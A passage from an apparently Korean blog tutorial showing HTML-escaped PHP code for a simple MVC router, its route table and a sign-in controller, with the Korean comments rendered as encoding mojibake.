    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$current_route&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;showCurrentRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* ìš”ì²­í•œ HTTP Methodê°€ ë‹¤ë¥¼ ê²½ìš° */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$current_route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRequestMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;notPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;cm&quot;&gt;/* ìš”ì²­í•œ íŒŒë¼ë¯¸í„° ê°¯ìˆ˜ ì²´í¬ ë¡œì§ */&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$arg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;combinedParameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

            &lt;span class=&quot;nv&quot;&gt;$func_test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$current_route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;routeClass&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;call_user_func_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$current_route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;routeFunction&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$current_route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;routeName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[&lt;strong&gt;application/controller/route.php&lt;/strong&gt;]&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtoupper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REQUEST_METHOD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/*               URL    Method  URL ê·œì¹™       í´ë˜ìŠ¤           í•¨ìˆ˜*/&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;signup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sign&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signup_index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;signin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sign&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signin_index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;signout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sign&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;profile/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;profile_index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;profile_photo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;profile_photo/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;profile_photo_out&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;board&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;board/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;category}/{mode}/{no&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;board&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;board_index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;elseif&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;signup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sign&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;signin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sign&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;signin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;profile/edit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;profile_edit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addRoute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;board&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;board/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;category}/{mode}/{no&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;board&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;board_index&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;notPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$route&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[&lt;strong&gt;/application/lib/init.php&lt;/strong&gt;]&lt;/p&gt;

&lt;p&gt;init.phpì—ì„œ URL ê²½ë¡œ ë¼ìš°íŒ… ì •ë³´ë¥¼ ê¸°ì…í•˜ì—¬ &lt;strong&gt;route.phpì—ì„œ í•´ë‹¹ URLì— ê²€ì¦í•˜ì—¬ ì •ìƒì ì¸ URLì´ë©´ í•´ë‹¹ í´ë˜ìŠ¤ì™€ í•¨ìˆ˜ë¥¼ ê°€ì ¸ì™€ ë¡œì§ì„ ì‹¤í–‰í•œë‹¤.&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;mvc-pattern---ì ìš©-í›„-ë¡œê·¸ì¸-í˜ì´ì§€-&quot;&gt;[MVC Pattern - ì ìš© í›„ (ë¡œê·¸ì¸ í˜ì´ì§€) ]&lt;/h2&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/* ì„œë¸Œ í´ë”ê°€ ì—†ìœ¼ë¯€ë¡œ namespase register; ì„ ì–¸ì€ í•˜ì§€ ì•ŠëŠ”ë‹¤. */&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sign&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;\core&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ìƒëµ&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/* ë¡œê·¸ì¸ ì¸ë±ìŠ¤ í˜ì´ì§€ ë¡œì§ */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;signin_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;login&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$alert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;alert&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;cm&quot;&gt;/* ì´ë¯¸ ë¡œê·¸ì¸ ë˜ì–´ ìˆìœ¼ë©´ í•´ë‹¹ ì„œë¹„ìŠ¤ ì ‘ê·¼ ì´ìš© ë¶ˆê°€ */&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$data_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isLoginIn_Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sign/signin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ë¡œê·¸ì¸ ë¡œì§ */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;signin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;login&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$alert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;alert&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$res_login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isLoginIn_Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;signin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;cm&quot;&gt;/* ì´ë¯¸ ë¡œê·¸ì¸ ë˜ì–´ ìˆìœ¼ë©´ í•´ë‹¹ ì„œë¹„ìŠ¤ ì ‘ê·¼ ì´ìš© ë¶ˆê°€ */&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$data_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
